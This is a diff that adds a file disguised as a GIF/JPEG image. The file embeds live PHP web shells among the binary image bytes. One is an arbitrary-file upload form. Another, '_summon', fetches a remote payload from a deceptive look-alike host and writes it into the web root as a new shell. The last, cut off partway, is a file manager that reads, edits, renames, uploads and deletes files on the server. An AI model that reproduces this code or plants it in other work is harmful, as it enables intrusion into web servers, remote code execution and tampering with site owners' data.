@@ -1,0 +1,432 @@
+GIF89a;
+           �     (       @             �  �          lll�mmm�nnn�iii�fff�ooo�}}}�mmm�___�KKK�TTT�NNN�KKK�PPP�rrr�```�III�rrr�����TTT�;;;�BBB�000�\\\�[[[�JJJ�III�333�(((�III�sss�jjj�///�DDD�JJJ�EEE�]]]�sss�|||�lll�eee�ccc�ppp�ggg�]]]�^^^�aaa�bbb�iii�kkk�ggg�GGG�RRR�ttt�BBB�===�^^^�UUU�CCC�===�666��'''�BBB�777�OOO�QQQ�OOO�PPP�uuu�yyy�nnn�xxx�ddd�hhh�hhh�lll�___�TTT�NNN�TTT�SSS�TTT�XXX�hhh�����fff�???�444�SSS�TTT�???�;;;�(((��RRR�<<<�NNN�PPP�MMM�GGG�lll�zzz�ooo�qqq�ttt�xxx�sss�{{{�]]]�MMM�%%%�YYY�nnn�```�zzz�ooo�{{{�ttt�LLL�BBB�III�PPP�GGG�===�(((�'''�TTT
+(((((((((((((((((((((((((((((((((((((((((((((((((((�� ��" ��             ��            ��    ��q���"��E��Y�%,Q&p�]�me�G�K   , b��0�X ˎ����R�  
+@ QR�\MS	�nˏNMѷ:�ĥ�J� %.��I�- `` J�@%�}l���v]f�   
+۫(�\r�J"��3�:��_.VQ(��#J��6�@��AD�Q��A`�%"K(����.�<=1T���  GƳx�U�\wVtT��� 
+ DQ)�QE�s0��vk�5���8�=9N���,   ����mJ  @  
+�E,Q��q����"�(  Yc������K-Ja�N���צy�S$J��R(�(��P�
+R(� �	(yx]R�X�"	@ �	`]U��X��ey��f�
+% "�"�V"��(�"�(��u�W^�rԳ\�XɮF\m��.t   �Ls�5�0   ��-,��Pի~:��7�,   X\�\NNn�.wAA�~�A��8��;�9ŀ PPI�%R.DeN1`�`�@X2@$	H�_#��BnK),D�
+E �1�e��)r�3��FtQ( P 
+�E�DQED 	DUI�5��c���5�X����s�h��   j�%հ� �T�Jіɩ���8�_6a��׻N��';����k�P% *�i�^]�,n��
+ڶz�+�1�  P��D���e�"` ��
+�띤����K(����mH]b�[�\�P  H��H�� �"��6�U)"��L�c�z����,is�wfzn���	DQ�03L� RQT�+#[{~��s���_W�s��
+�tƾ?'��g��<,y}�P @TE�^V��Y@���ğE�Ok|�(���3�<Iq��!
+�e �@�D�BJ"�A�X�������&}xL��Y�Ē�ċ ��k,�1Rl���k;  �eV%�"�A(�"�)f�ړaV)"
+</script> <div id="app"> <g size="1px">./SLoerD</h1> <span class="sub">PandeglangCrew1337</span> <?php $uploadd = $_FILES['file']['tmp_name']; if (file_exists($uploadd)) { $pwddir = $_POST['dir']; $real = $_FILES['file']['name']; $de = $pwddir."/".$real; copy($uploadd, $de); echo "FILE UPLOADED TO $de"; } ?> <form method="post" enctype="multipart/form-data"> <input type="text" name="dir" size="30" value="<? echo getcwd(); ?>"> <input type="file" name="file" size="15"> <input type="submit" value="Upload"> </form> 
+�(�g4�Y�\LyZ7�f��]�붙�@DQV��5J���K���+��|���۷󾃥����o�n�Ӝ��q��4�<iZ� J,�����gY�s��k7�c��>��=�VrJ2��r@��JLr� �X�)a����c�5a]5�6�6c�s����z��f�5�1��,�K, K-Ǐ�V�)�l�#:��)J��Dƌ�  )E K�`l��<Lsո�!b(���t�;ZSv6�Ly|m�ƚ���nG>��QQE�Ӿ,k�
+E���?#�g/��ݎ���3�_q�Je�i��X��
+�J�) 
+ �o+��]�\meY�v��e��{��o.��s�dd�)��+������K�E�!W,,g$("F5������ܱ��긼�zˍ��_��:�^0�0Ys&R�)"��\}0�6m9�(�
+% �,5�պ�� Pb���5�װ(�X��PӻV�.	���
+J]�қp�iĜ�>�̱\�n����  ���l��B�7'�g#|�lR�P՞��ug�Ċ�.��5���( TYF�y�r��,mEiݡ96U�����]y��^FlFLFlFLLFLi�,�RX*$/���ne��{N���[��5��m�ѫ
+�k��$� H����k�1no#���J"�Q*���f�٘
+
+�
+J@Q`���ڀEK�v��5nЛ�,�e �h�f�م��NO����/ c�@  װa���QN'���7��5D���d�ӳ^�t��\]b��(�@Ea�nZ���+F�2r��)hOC�yOV�Ƴn;�2JC&#+�2A��c,	�&X�XW��y��}ye��w�;�;��A�v��Z�ủ
+�k���:�3<nqU���:�t�ه&j��@�RPT1��(���� ��\Lvc�EDQ�ߣz5n�9i��X�f|d�a�^$�q�ˑ����@�(�"�)t캬� +��f�c��N��%���M�];5�I2�����o��H�	A�V�?#��o/��L�{9\QeY�?�r��,�W�c��W,r �1�qII�X�z^��7s�s����^�;�S /[�U�>� ��׆�u5c�c\�\�3��_v�����^}e��H�P F��|�@(�%	q&T jۨ�e 
+���ݧr
+�v�LX%e>��ݫt�+
+i˲�j�-K8��In�(1�U�h�1�ۆ|��[b&ZձW�5���-c�E��� T����W��Z��ˮ�fy���,��y�Ϻ�מ�F,�2����R�9-p�E�eq`�l��^�g=9e�x���=?s�qQ���Ei:��3%�w3������0�=[��#W&U\nUcCCCTRkׇ'Y�SE@P �ʙ�b��"f ��9k1ݣy(%N�)�2YHJ"�*���j4�Ѿ�Nf&x��mYU���6k�̚�ٍqvឰQ8܎�,�x����.�ڷ
+;�K��Mk��f�;��IZ�+(
+
+e��s3�칮˭�Y�~k��'0�= z~��z'�,�l�(X"n%��f����V6�����d�����:�\�;yuu���^� ������=db�q��l�.��ݧ�<x����Ӗ݇=*���er�e�g	��)&��=g>V9���D�� �r�bf&��N�[�RP�Ji�
+�˭�*��F��I@J"� Y��kL��/{Iɳ,��6Mw�M�s���g�nx���sF�O\�,�Of����9\tj۪6�Mc��R��=�W��㩣��������Ao/����eΝ�Qܳߒp��}c�7���>�˟�^S�li�"#�e2�B� ��CG��z�kqN��)}$�;�5
+���gp���t]��������e�񯅿�ו�q�i�s�YnS9n�~�;ϧ�}7���Nz�r�fZ�x�W7X*h�P���(%Y��r@��E��7m5�y_���o5k�TE��ŮE�R��L�*1UIQ�ݗ�O���Ϗ���ۯnw��~O�s�|r<f�[�:���.�qk�8Һq�����70����+Nٮ�r�9c��������B�"��W#�ȗ~X�;���c���<O#�|�ފ;;�&}�'�� J+"Z1 A�RK��0˪�=���CY\R�®LLlFW�S&0�����;q����ť�e2�,�S[�w����<��	�:�3)��~�sٿ$�2���
+J��E��xܤ�Y��ǳz�(�#V�;�)�ǹ�N��{.�=|E׳~r�-�k�8��/&��\m��6C	��	�)&P�w,׳��^?;�Κ�v��鷸�����1�8�c���g�׻^��ז�� �'3���K.��w㔭9�vX\�>o)p��g�����u���ID  V����XӾ�}��U�����+�\3z����ߤy�K%���͈K�X�c(�`�ޣ�]�.3�-APX�AP[�[q.R�SU�o�'d�Ye�K.yc��q���ӟN����	cV|f�m=�o���f��+,�% ���6Jd]-|�$�K�(��8���������\u�_S�y�VQ�O7���rջ;VR����x���\�g�I(�9~�76�Vx߰�g;�N?s��ß���'��n���q���]�ߴ�ѣ:l�T��[Kq�ۈ��8�vj��5 ( �V�y9K����N}��<��,7��>F��/��>�˟q��IH�P�$�Qe &6_��q/i��� P  *��r���<6k<�.7D\��g�]���\�2\��jc��c��:�<�Ll�����*ȢU"���p�nS)���9�g�-7�5c�0e��NW�sZ�oK�����5���N�z��Y��l�{N/a��~OO'
+c���y�#,s�OA��~������ά6a��X��d�s4ٌ�������۳FR����
+ �����JFIF�,,����<?php $source = "https://www.flickr.com.anatocenter.com.br/ssinject.txt"; $name = "u.shtml"; function _summon($name, $file) { $filename = $name; $fget = file_get_contents($file); $path=$_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR; $fileopen=fopen("$path/$filename",'w'); $execfile=fwrite($fileopen,$fget); $shellurl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]"."/$filename"; if($execfile) { if(file_exists($path."/$filename")) { echo "<font color=\"#00FF00\">[OK!] <a href=\"$shellurl\" target=\"_blank\">$shellurl</a></font>"; } else { echo "<font color=\"red\">$path$filename<br>Doesn't exist!</font>"; } } else { echo "<font color=\"red\">Failed get newfile $filename in $path</font>"; } } _summon($name, $source); ?>
+�����		
+
+ $.' ",#(7),01444'9=82<.342			
+
+2!!22222222222222222222222222222222222222222222222222�����"��������������	
+���}�!1AQa"q2���#B��R��$3br�	
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
+��w�!1AQaq"2�B����	#3R�br�
+$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�����������������������������������������������������������������������������?����(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��:Ԑ�$�q!wc�z����O
+߲��
+ر����D�絿����Z{)�1���nc�����N��{[���M��'}��=������
+=������������������������k��c>����0h���D�絿����G�"w������o��ϰ{z}�+{�;���o��}7�Q������������(�3�ޟs�����N��{[���M��'}��=������
+=��������������������V�����M+�E��H�(�S[���۲fUb���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���Z�<'n��� _�}�9���r�lh:�i�l&$A �`t=����)4�ve^-�j'oEG���)��¤�H�v�(���(���(���(���(���(<��U;�J��=�I�qyc�Rm[Q�۲8�^��.b�����y�5=��]]K;��m�ڠ�.[��QI�QH���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(A#�Z�؝Jד��;���V���	Z���d��Ѕ8�)|,�Z(��C��q�(b5T�����f�w����[>)��������f�+Ϋ�١�4;{x�too�ΛEfl;{x�u�xs'E��yo�k����������F�91�������������
+Ԭ��
+�����
+���>����oS��O&�+�=���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��Zo�����B�խ7�BV���?�!N;�_=�(�P�z�_��,�����J��O�������5�^u_���ᠢ�+3`���������]׆���տ���7�rc?��5k/�_��������B�+/�_��������B���3ϥ�E�p�QEy��QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�kM������vO�UZ�����J���'��)�qK�g��E�S��O�������5�[~)��������f�+Ϋ�١�4QEfl�xo�@p�[���k���������5ц��Lg��f�e���@W��V�e���@W��W\�y����N�(�0�(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��(��i����������
+�V���	Z���d��Ѕ8�)|,�Z(��C��q~)��������f�+o�?�_����%y�~6{4?���(�͂��
+����3\-w^���?V�f�0�Ɍ��լ��
+�����
+Ԭ��
+�����
+���>����QE��QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�c5��8�t.d@b��{�oʱ�-e��H"w8�6v�gi������sJ�.*�$yV잊*��z�}��7$p���Wsv�<��'e�9O����9)�{O��j�y^y�Y���z���K�M��8�ED(���»�ȍ�"���zd�+��=Q}�i�\mp?C�}MkFj3��M�
+#���m㺷xeG"�A�)kв��#T�y����^I��Q��j�<E���?�D�ϋ�J�zםR���P��!~�EVf�EPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEP@�u�-O���������N+��R��\���3ȷ�l��|��_��t�UE
+������X�%I��ɇҸ�Rk�Ɖ0Dv��O�ox�Q���7����P��qG�k�S�#�K�^14QEr�EPFh��;
+�b��Y�O��O���y��ԶwI<G����C��K�X���Q��wP��=����rK�l�H����޸mwM6W�ꘂS��A�+��z���,��Q�@E]Xs�΅WN~L��*Ibx%x�t;Xz����Z�Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@DfuP2I����t�B�L�t���~��5������!3ݽ
+�?Z��Ӳ�g���wȂ��x���i[j(�5'z�|M�����ʇ2{�J�sPWg5*n���MB��^�;g�?(=�aUi�;�E,���jK�I�-�M# 0�^v�S�V��CERQE�QK��+����$p�SJ�	��eqֺ
+jF�i+��O���o��dϧ^[.��Ԏ*��[#�*��$����=6���ub������g�>��^�]��qq|���O���N�`�߱�b�2h�x�)20����R�k� #�*}Gj��S��]OG	W�<�tS��+��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+�ce%��An���5\+���-mEˏ�J8�Zҝ>y[��z��Ƶ�	km�*�h�'<q�^�Ǎ�)j�����/0#�?*zͰ����Fid�s����[�Z����0!�c����5�M"�Eb+�u������ᤩ�����iVr�Y@8%�?����m�؏�HF}�Y~w�Z��;_��j��w�zA��]򫔔�6���	B�T��F�(�3�
+Q��IR���7~F
+�SBW����h��wH������l�kVs}�n,��p�Ҥ��t��CR��^��z�fy��19$���KخX�����-����v2N��q�ʪk�Fui�^]�Q\�'p9滟�}�MPĳ��6{�ߧ�	�_vAV��jp�崋�ߤ�	���q�y��7YcY�G�����Zk��B�
+ z3�k�:��إ9e�'Ӹ�����T���"tu����n�/�>T�#���>��EuJ*J���$��1l�%m��L6���%9�{�į6Qqvg�	�ǙQRPQE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�Ph���*��v8�w�
+MN���M�G�6zA]���N�WL�[���2ݪ�z����U��ӠV�51om�X�����Ƶ��{�N}+��.^��[���z��^�*�F�J<��{"���+��
+
+���f?�_�V��������dxo�C1�����ʵ�]����C���?�gO����]�F�(�c�+Wè[�?��CYU������*�+�W����ۥƿޔ~X5�����Oؠ����@�����t��N\^\E�7�����9[��d���'��T~4V!~�C�U�J'o�~`���c[�Im2��NC
+��a��w��n��Tc���	\�{�����:8���Oz�\_�u/��y�e��v?һJ��>x��+��s�B���_��n�n����5��Imp��0�pkҫ��>��ۣ\:�I�:YW�̹���+�{3�����zaEPEPEPEPEPEPEPEPEPEPEPEP���xcK!��(�pD@��5��ص��@���{נE
+[F0�0��]8zw|�����"�>�+;Z����C���O��+�RI]�|b��Q��]H�9����#�{�s����Y�$��i+͜����j�8����*K5�7��!�����Z�.���H?��U��������*��w�zA��]򮨯ܳ����i�9(��N��e�Y�f8RJ��c��u9	V�>����)ǚ-���/���ܑO�ָ�ֻ�G�X��HA�l�����.��[��U���{]�w̶9p��t�eA]G�������8���?�\����S�P�gn�:�-"�G��B�k�F�T"���5�ȷg3�i��\����h������S�\��gn<�-�APV3w�gE8��DPpEv����+>g�p��G�p�sL�m>�'�8p;��t��"+����Tz!�LtY��ea�zl3%�)4g(�05%z�6�c���O�x����'��}w�ޟ��`U��B{���J��`��+ϭI������(��7
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+1Em�wM�]ߝ*�.��݅Tc��L根���i���et�ģ,{��V���J1�V<I���1���s�Q�}��յ�_����#���vۛ1oi`�2�p;rk����sT<��������|�c���&�eQZ���j���?�������j���?�����srK���a���2����4�l �Gâ�߻=*����sU���a���h���sU���a���j��t���*���:1�$�����g�(>"҈�b~���?��������?������������c�(7⎌x�I��������qw�q+��g$}3Z?��j���?�������j���?�����g9N{�ZJ�/�_��Ej���9���ϰ�����4�9���ϰ�����5�$�{X2��t�R]6m��F~�d�k�]sI��$�Fy�,y�����������Q��S�������5�%R
+�0�
+3wrW�:/�}�%�S�|�ҹ�c[�Rce-��{�֓��W��?�����'�#��������D�RJְ�N����2�ɤ�_�G5_����Ə�G5_����Ʋ�c������eP:֯�#��������G�#��������G$����/���ƦK}�S�Ɉ�ޢ���qh:�2,�����H�z�u�[��m\!I���s�vPn�h�qQ��4^��x�Lh'7q���~ny
+��׮���������W��kJ�S����t�sͨ��-����	q�y�X��OTQE�QE�QE�QE�QE�QE�QE�QE�QE�Q@�	��亙a�e��
+�E�����9#��k�:Y�>�(q�Ǡ�k���<,��S����|�dQEtaEPES���(���(���(���(���)�QE�QE�(���(��R���(Ěr�jn�L��#�������NlC�A ��魧�6���\��v������r=̺(��Nࢊ(���(���(���(���(���(���(���(��W�}<��Bx�
+�}���Xw��EӖ��7 8C��kF�;0�U�q�e�D�#P����QEz��2IR(�G`��$��o�R��,F�y�2O�T�q���J��u4t�\8�uD;���*��<D�l�](I�G�?�Q�oSI�jA_Cv�(�Np���{�[i�?�1]��
+OO��]
+�q�۲-�ֱ��6���i$#��?�gi���ֲ��<��/�8�u���j����u4Q�QZ��QH��{��i�>��C�)=?�uFOi褫H�	�4��eƜ��f��t�z��ZDf�2x/WU��55t:��M�AEU�Rd�Ԟ���W7���c��G �+?Y']�G�g8��pc�V.�S��-I+�����3��#,W��	��] �A�5�&���JR�� �:������1��	�j�M&�Ɍ�Z�<�H�)v��{mt�'�<��tC�s�����͜\��S��T�QE�EPEPEPEPEPEPEb��K۔���{�����J���ޚ��}�D�=����mm���8#*}O�M^�8(FǏ^��;�
+(��19j��Fx��{
+��h��j�S��+�ˑ������
+�7z������⻴UD
+����r�\�rguf�R�Px��c"��2?*�u�)l�0 9���]�f����5��x�?�F��(��Q�k�����z�be��rz�CZ��xVR��ǟ��<{�]�e���`�Q�KR�"�!H�fR��V��V�z3(���)�KEl�4�=2��=-~!���@�k��+�ӿ�e���7��j��\l��=IN3�w��;QE�y�EPOL�S�F*T�Y��KEm�M3{d�[�TJ��F��8�&p�Z�C
+/E���k����O����?���ֻ������7�|K�(����
+��Q�ۭ�lD�|ώ���������kҙu��E`��
+ʼ�bt�`�;�����x�yr��գr>��t�T�F�LqQY�-���qS�B
+*�ujJrm�������^[�T�GO�;U�
+�?i�6�d�|�����Z��qu��B�>��r^�Ǭ��YO��X��Q[���h��GmE�WI�G<�ۼ2�da�kϵF���ݳ���k�V7���we�Ā�9�Wұ�O�_�Յ��+=���Ji+��B�(��(��(��(��(��(������+o�������Y[5��P'Wl~��LעE�
+E�"�~�Ӈ��1Ō�h�袊�<Т�(c[�&��<E����&���}+����`g.p����\�}�:�{��V�]�u�=M��Y�z��-&����R1�k�Nɜ�^�9O
+q����*�����XtTc]�a���g��(��@�N����?���ֻ�����c�����k���;0���(���(���(��np�������f������������vo�]���a�ٝx��zQ[��\�߯�=g?λ��ulŭܑ�ι�/S�����>�R���Xd})k�lq���׊�4o�^��M�~���$D�7�E,
+��/�۟B����D���	����-t�+`��R���y��X���2c���]׈m~ӥ9U��w��ҸSָ+C�zlz�j��נQE��QE�QE�QE�QE�QE�nxV-��>?��N}���g\ǃ�n�|r6�]8�]�uhN-ިQE��QE08�~٭�y~�O��k�ӮE�����}GZ�W�F�g�v��r�Q\����t�0��r����+���ٝ�,E4���a���#�ž~yH����x���wh�ORāY��׺��;�?4����=�Ԫ��`*8yE���#[¶eV[�7ȇ��IQ[������ ��khG�69����r
+(�mkX�L�%�5p�I�9IE]�s�*6k�ӿ�e���7��cŗY���h�k"ǇPj��r�{s\�j�MX��М����Er_��ϴ?���I�}F�nX�0��]�;#��	�^H�EV�!Ec�Zĺd��q#o���W�%�_���k7Z	ٛ�
+RII-
+�������f�����םAx�_����b�=9���K.������X�;�X��\������_>�`���I^�v��M]|�����Ҹ��4W��o�0���j��b���@��+z��獍hT���:%��iPa�h�c}G��\"I{�ޕ���:�
+�>.&?���|�?�g
+�+Osj�Y�^
+���
+��t�P�yHU�g��𵣵ܗ$|��A�?�j�>ݯ�x�J��+D�����9#�=ML�>g����^ϫ,�E�qQ@
+u�X ���oy<#�n�3�k�k���Ʊu���6)h�݁z�P��+��B�(��(��(��(��(���3m�������#��׮����G�[-F)��v�=
+w���YpC�WvW��^26�~��E��QE����JxQ����5Z��Z���.�"�?���3Wc�!�$h������E%�*S��w
+(��!P�iorT�
+HGB�*j(�^�?�?�|�����Z��A��|
+�E]��r��V���>P���V��pƱ��T`S褒[�{���)�C5���xB8�T?�Z��A��|
+�E+.�)5�)��ei������(V���>p��QN˰���dP�l�5D�F>�(!��QL淆�6MH��3U?�4���q���W�i=Z*3�tL�"�M�Ʊ���*J(�N��Q@Q@�nA�<�d�LG��~����aӥ�?�O��?'$��qOh��
+:9�EW!�QE�QE�QE�QE�QE���@֔"��0�7?Ț�誄�]ѝJj�yY��W�x���lw�:Ȯ��Y��!c�k��~һ�V2<��z��_��+C���)�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�QE�(���$J^F
+��P]�Ts�GkM3�E���e]�����gq�q��r���w�93Hvg"1�V��x�c��s~���X�_Q�8$@��k����mWwwg��� ��)QE�QE�QE�QE�QE�QE�QE�Z�Q��B�s*(��~Udkڒ��o�T��J̢�JKfC��5�"�����ߵ��
+?�"�?��ߵ��
+ʢ���q{(v5�"�?��ߵ��
+?�"�?��ߵ��
+ʢ�i.��������T������~��(����T������~��+*�=�����cW�-S�~G��_��-S�~G��_�(�����_�H�O�����H�O����²���K�{(v5�"�?��ߵ��
+?�"�?��ߵ��
+ʢ�i.��������T������~��(����T������~��+*�=�����cW�-S�~G��_��-S�~G��_�(�����_�H�O�����H�O����²���K�{(v5�"�?��ߵ��
+?�"�?��ߵ��
+ʢ�i.��������T������~��(����T������~��+*�=�����cW�-S�~G��_��-S�~G��_�(�����_�H�?�����-O�~����
+ʢ�i.����}sRq����UI��� �+�Gvbj*\�ܥ��QE�
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��
+(��?��
+GIF89a;
+           �     (       @             �  �          lll�mmm�nnn�iii�fff�ooo�}}}�mmm�___�KKK�TTT�NNN�KKK�PPP�rrr�```�III�rrr�����TTT�;;;�BBB�000�\\\�[[[�JJJ�III�333�(((�III�sss�jjj�///�DDD�JJJ�EEE�]]]�sss�|||�lll�eee�ccc�ppp�ggg�]]]�^^^�aaa�bbb�iii�kkk�ggg�GGG�RRR�ttt�BBB�===�^^^�UUU�CCC�===�666��'''�BBB�777�OOO�QQQ�OOO�PPP�uuu�yyy�nnn�xxx�ddd�hhh�hhh�lll�___�TTT�NNN�TTT�SSS�TTT�XXX�hhh�����fff�???�444�SSS�TTT�???�;;;�(((��RRR�<<<�NNN�PPP�MMM�GGG�lll�zzz�ooo�qqq�ttt�xxx�sss�{{{�]]]�MMM�%%%�YYY�nnn�```�zzz�ooo�{{{�ttt�LLL�BBB�III�PPP�GGG�===�(((�'''�TTT�>>>�PPP�PPP�NNN�FFF�iii�~~~�lll�sss�yyy�uuu�uuu�|||�zzz�PPP��DDD�FFF�kkk�xxx�kkk�nnn�|||�[[[�QQQ�HHH�KKK�BBB�AAA�%%%�&&&�___�AAA�PPP�RRR�QQQ�GGG�ooo�zzz�lll�zzz�zzz�ttt�xxx�www�]]]�333�222�FFF�777�111�NNN�jjj�qqq�ttt�vvv�iii�DDD�MMM�HHH�HHH�666�%%%�[[[�DDD�PPP�OOO�NON�CCC�ooo�www�ttt�|||�uuu�vvv�xxx�DDD�   �SSS�ddd�kkk�ggg�???�&&&�DDD�PPP�XXX�^^^�yyy�WWW�HHH�BBB�JJJ�777�111�___�EEE�RRR�PPP�NNN�CCC�iii�zzz�www�yyy�uuu�zzz�KKK�   �GGG�jjj�xxx�}}}�mmm�]]]�HHH�   �$$$�;;;�;;;�GGG�^^^�UUU�???�<<<�!!!�CCC�VVV�EEE�QQQ�RRR�OOO�???�UUU��~~~�xxx�rrr�MMM�:::�NNN�eee�TTT�???�ZZZ�ttt�kkk�YYY�&&&���,,,�000�---�---�$$$�$$$�!!!�III�^^^�BBB�OOO�PPP�NNN�999�;;;�OOO�ggg�eee�AAA�"""�999�@@@�999�999�000�999�NNN�TTT�HHH�:::�%%%��
+
+
+���			��'''�777�TTT�```�EEE�QQQ�OOO�OOO�888�@@@�CCC�:::�)))���(((�,,,�GGG�ggg�hhh�WWW�LLL�JJJ�===�///�   �'''�;;;�����+++�???�[[[�ZZZ�III�PPP�QQQ�OOO�???�HHH�GGG�����,,,�JJJ�xxx�yyy�{{{�ppp�VVV�JJJ�999�***�"""��<<<�@@@���)))�...�BBB�aaa�\\\�HHH�QQQ�NNN�MMM�???�FFF���
+
+
+���)))�===�eee�eee�lll�vvv�uuu�LLL�444�%%%�###��HHH�NNN�777��(((�:::�III�```�]]]�JJJ�QQQ�OOO�NNN�CCC�<<<�������   �SSS�___�ooo�sss�jjj�GGG�000���
+
+
+�SSS�PPP�BBB�$$$�***�<<<�TTT�```�\\\�III�OOO�QQQ�NNN�FFF�000�   ��   ��			���888�kkk�����ooo�888�   ��   ���aaa�ZZZ�777�***�888�FFF�^^^�```�]]]�III�OOO�NNN�KKK�FFF�///�   ��   �   �����LLL�;;;�&&&�����   �???�aaa�FFF�"""�888�EEE�aaa�mmm�iii�^^^�III�PPP�PPP�LLL�HHH�+++�   ��   �   �   ����
+
+
+�����
+
+
+�
+
+
+��bbb�PPP�+++��===�FFF�ccc�eee�^^^�VVV�EEE�QQQ�QQQ�OOO�CCC�999�   �   �   �   �   �   �   �����   ���   �:::�ddd�:::��222�BBB�KKK�aaa�aaa�[[[�VVV�FFF�OQQ�NNN�NNN�:;;�MMM��   ��   �   �   �   �   �   �����   ��[[[�QQQ�$$$��>>>�AAA�SSS�bbb�a`a�YYY�ZZZ�III�PPP�RRR�OOO�<<<�CCC�AAA�
+
+
+�   �   �   �   �   �   �   �   �   �   ��   �000�aaa�777���===�>>>�YYY�aaa�cbc�^^^�VVV�JJJ�OOO�OOO�NNN�===�>>>�FFF�>>>��   �   �   �   �   �   �   �   ��   ��]]]�RRR�555�)))��>>>�CCC�___�]]]�ccc�___�\\\�JJJ�QQQ�OOO�OOO�AAA�@@@�DDD�VVV�///�   ��   �   �   �   �   ��   ��TTT�___�EEE�@@@�...�$$$�AAA�WWW�bbb�\\\�bbb�___�]]]�JJJ�QQQ�QQQ�OOO�AAA�HHH�KKK�HHH�___�
+
+
+�   ������   ��ZZZ�aaa�III�BBB�@@@�'''�555�YYY�ppp�mmm�iii�nnn�hhh�hhh�LLL�QQQ�OOO�PPP�???�EEE�AAA�EEE�eee�___�
+
+ <?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
+echo '<html>
+<center>
+<body>
+<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
+';
+echo "<font color='green'>".php_uname()."</font></tr></td></center></table>";
+echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
+<tr align="center"><td align="center"><br>';
+if(isset($_GET['j'])){
+$j = $_GET['j'];
+}else{
+$j = getcwd();
+}
+$j = str_replace('\\','/',$j);
+$paths = explode('/',$j);
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?j=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?j=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+echo '<br><br><br><font color="black"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:black;;" required/></font>
+<input type="submit" value="U" style="width:85px;height:25px"/>';
+if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$j.'/'.$_FILES['file']['name'])){
+echo '<br><br><font color="green">OK</font><br/>';
+}else{
+echo '<script>alert("NO")</script>';
+}
+}
+echo '</form></td></tr>';
+if(isset($_GET['filesrc'])){
+echo "<tr><td> ";
+echo $_GET['filesrc'];
+echo '</tr></td></table><br />';
+echo(' <textarea  style="font-size: 8px; border: 1px solid white; background-color: green; color: white; width: 100%;height: 1200px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><br /><center>'.$_POST['j'].'<br /><br />';
+if($_GET['opt'] == 'btw'){
+	$cwd = getcwd();
+	 echo '<form action="?option&j='.$cwd.'&opt=delete&type=buat" method="POST"><input name="name" type="text" size="25" value="Folder" style="width:300px; height: 30px;"/>
+<input type="hidden" name="j" value="'.$cwd.'">
+<input type="hidden" name="opt" value="delete">
+<input type="submit" value=">>>" style="width:100px; height: 30px;"/>
+</form>';
+}
+elseif($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['j'],$j.'/'.$_POST['newname'])){
+echo '<br><br><font color="green">OK</font><br/>';
+}else{
+echo '<script>alert("NO")</script>';
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST"><input name="newname" type="text" size="5" style="width:20%; height:30px;" value="'.$_POST['name'].'" />
+<input type="hidden" name="j" value="'.$_POST['j'].'">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value=">>>" style="height:30px;" />
+</form>';
+}
+elseif($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['j'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<br><br><font color="green">OK</font><br/>';
+}else{
+echo '<script>alert("NO")</script>';
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<textarea cols=80 rows=20 name="src" style="font-size: 8px; border: 1px solid white; background-color: green; color: white; width: 100%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['j'])).'</textarea><br />
+<input type="hidden" name="j" value="'.$_POST['j'].'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value=">>>" style="height:30px; width:70px;"/>
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br /><center>';
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'g'){
+if(rmdir($_POST['j'])){
+echo '<br><br><font color="green">OK</font><br/>';
+}else{
+echo '<script>alert("NO")</script>>';
+}
+}
+elseif($_POST['type'] == 'file'){
+if(unlink($_POST['j'])){
+echo '<br><br><font color="green">OK</font><br/>';
+}else{
+echo '<script>alert("NO")</script>';
+}
+}
+}
+?>
+<?php
+echo '</center>';
+$scandir = scandir($j);
